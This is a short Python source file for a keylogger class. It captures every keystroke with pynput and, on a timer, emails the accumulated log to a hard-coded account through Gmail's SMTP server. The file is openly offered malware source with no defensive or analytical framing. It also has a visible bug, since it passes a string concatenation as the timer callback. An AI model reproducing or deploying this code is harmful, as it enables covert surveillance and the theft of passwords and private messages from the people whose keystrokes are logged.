import pynput.keyboard, threading, smtplib
class klogger:
    def __init__(self, timeinterval, email, password):
        self.log = "Congrats, Kaylogger is started\n\n"
        self.timeinterval = timeinterval
        self.email = email
        self.password = password
    def appendlog(self,string):
        self.log = self.log + string
    def prss(self, key):
        try:
            ckey = str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                ckey = " "
            else:
                ckey = " " + str(key) + " "
        self.appendlog(ckey)
    def report(self):
        self.smail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.timeinterval, "\n\n"+self.report)
        timer.start()
    def smail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email,email,message)
        server.quit()
    def start(self):
        kl = pynput.keyboard.Listener(on_press=self.prss)
        with kl:
            self.report()
            kl.join()
